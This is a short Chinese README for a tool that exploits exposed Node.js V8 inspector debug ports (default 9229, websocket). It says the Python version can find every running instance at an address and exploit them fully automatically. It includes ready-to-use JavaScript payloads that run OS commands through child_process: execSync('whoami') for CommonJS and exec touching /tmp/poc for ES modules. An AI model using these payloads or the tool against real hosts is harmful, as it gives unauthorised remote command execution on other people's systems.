# py-nodev8-tool
node.js v8 inspect的利用工具

调试端口默认为9229，使用websocket协议。

工具可以pause并执行表达式。

因为node同时支持cjs和mjs，分别使用require和import来导入库，工具自动pause不确定会暂停在那种代码环境下，所以可以都尝试一下，如果失败多尝试几次：
```js
// cjs
require('child_process').execSync('whoami').toString()        // 有回显

// mjs
import('child_process').then(({exec}) => {exec('touch /tmp/poc')}).catch((error) => {console.log(error)})        // 无回显
```

python脚本能自动获取指定地址所有正在运行的实例，可以全自动利用。而js版本能在chrome中执行但因为同源策略无法获取指定地址所有正在运行的实例，只能半自动。